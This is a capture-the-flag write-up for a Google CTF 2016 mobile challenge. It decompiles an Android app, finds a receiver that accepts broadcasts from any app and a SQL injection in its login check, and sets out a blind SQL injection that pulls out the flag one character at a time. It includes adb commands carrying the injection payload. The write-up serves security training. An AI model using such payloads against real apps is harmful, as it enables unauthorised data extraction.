# google-ctf-2016 : little-bobby-application-250

**Category:** Mobile
**Points:** 250
**Solves:** 24
**Description:**

Find the vulnerability, develop an exploit, and when you're ready, submit your APK to https://bottle-brush-tree.ctfcompetition.com. Can take up to 15 minutes to return the result.

## Write-up

by [bburky](https://github.com/bburky)

First, using [d2j-dex2jar](https://sourceforge.net/projects/dex2jar/) extract the apk and create a jar:

    $ d2j-dex2jar BobbyApplication_CTF.apk

After opening the jar in [jd-gui](http://jd.benow.ca/), the first thing to notice is that on application startup, the BroadcastReceiver called LoginReceiver is registered. Any application can receive these broadcasts because no permissions are specified. Our exploit application will be able to receive these broadcasts too.

```java
protected void onCreate(Bundle paramBundle) {
    Log.d("Startup", "Bobby's Application is now running");
    super.onCreate(paramBundle);
    paramBundle = new IntentFilter();
    new LocalDatabaseHelper(getApplicationContext());
    paramBundle.addAction("com.bobbytables.ctf.myapplication_INTENT");
    registerReceiver(new LoginReceiver(), paramBundle);
    ...
```

Looking in LoginReceiver, we can see how these broadcasts are handled:

```java
public void onReceive(Context paramContext, Intent paramIntent) {
    Object localObject = paramIntent.getStringExtra("username");
    paramIntent = paramIntent.getStringExtra("password");
    Log.d("Received", (String)localObject + ":" + paramIntent);
    paramIntent = new LocalDatabaseHelper(paramContext).checkLogin((String)localObject, paramIntent);
    localObject = new Intent();
    ((Intent)localObject).setAction("com.bobbytables.ctf.myapplication_OUTPUTINTENT");
    ((Intent)localObject).putExtra("msg", paramIntent);
    paramContext.sendBroadcast((Intent)localObject);
}
```

Apparently this application expects a broadcast with the the action `com.bobbytables.ctf.myapplication_INTENT`, containing two extras `username` and `password`.

Let's install the vulnerable app into the emulator to test it. Install the app and then open logcat. Use the following adb command to test LoginReceiver:

    $ adb shell am broadcast -a com.bobbytables.ctf.myapplication_INTENT -e username admin -e password hunter2

The following lines will appear in logcat:

    05-02 18:58:43.145  2646  2646 D Received: admin:hunter2
    05-02 18:58:43.147  2646  2646 D Username: admin
    05-02 18:58:43.148  2646  2646 D Result  : User does not exist

In LoginReceiver we can see that the result will be also sent out as a permissionless broadcast. Our exploit app will be able to receive it. The message "User does not exist", the result of checkLogin(), will be sent to our app in the broadcast.

Next we look at checkLogin() in LocalDatabaseHelper. We immediately see a SQL injection vulnerability in the rawQuery() call. However our attack will have to be a blind SQL injection because the only results will get are "Incorrect password" when the query is successful, and "User does not exist" when it is not.

```java
public String checkLogin(String paramString1, String paramString2) {
    SQLiteDatabase localSQLiteDatabase = getReadableDatabase();
    Cursor localCursor = localSQLiteDatabase.rawQuery("select password,salt from users where username = \"" + paramString1 + "\"", null);
    Log.d("Username", paramString1);
    if ((localCursor != null) && (localCursor.getCount() > 0)) {
            localCursor.moveToFirst();
            paramString1 = localCursor.getString(0);
            String str = localCursor.getString(1);
            localCursor.close();
            localSQLiteDatabase.close();
        if (Utils.calcHash(paramString2 + str).equals(paramString1)) {
            Log.d("Result", "Logged in");
            return "Logged in";
        }
        Log.d("Result", "Incorrect password");
        return "Incorrect password";
    }
    if (localCursor != null) {
        localCursor.close();
    }
    localSQLiteDatabase.close();
    Log.d("Result", "User does not exist");
    return "User does not exist";
}
```

First, let's check what the database looks like by examining the app's database directly (you need to have registered a user in the app first though):

    $ adb shell 'sqlite3 /data/data/bobbytables.ctf.myapplication/databases/LocalDatabase.db "SELECT * FROM users"'
    1|test|08fdc2c757be2ea1067f0c36d4ca2634|ctf{An injection is all you need to get this flag - 08fdc2c757be2ea1067f0c36d4ca2634}|3107

We will be extracting the `flag` field of the table. We can use SQLite's [substr() function](https://www.sqlite.org/lang_corefunc.html) to extract the flag character by character. The username `" or substr(flag, 1, 1) = "c" --` can be used to check if the first character of the flag is "c". We just need to iterate over the characters of the MD5, only 0-9 and a-f, so this shouldn't be too bad for blind SQLi.

We can test our injection with `am`, checking the first character of the flag:

    $ adb shell 'am broadcast -a com.bobbytables.ctf.myapplication_INTENT -e username "\" or substr(flag, 1, 1) = \"c\" --" -e password hunter2'

Success! In logcat "Incorrect password" is printed, indicating that the query was successful.

To create a full exploit, we need to create our own app, register a BroadcastReceiver for `com.bobbytables.ctf.myapplication_OUTPUTINTENT`, and send broadcast messages to `com.bobbytables.ctf.myapplication_INTENT`. Because there's no interaction with the emulator, we need to start the exploit from our Activity's onCreate() method. We are given the logcat output from the emulator, so we can just log the flag after we find it.

The full source of the exploit Activity is in [ExploitActivity.java](ExploitActivity.java). Create a new hello world app in an Android IDE and replace it's Activity with ExploitActivity to use it.

## Other write-ups and resources

* <https://blog.lse.epita.fr/articles/78-google-capture-the-flag-2016-mobile-category.html>
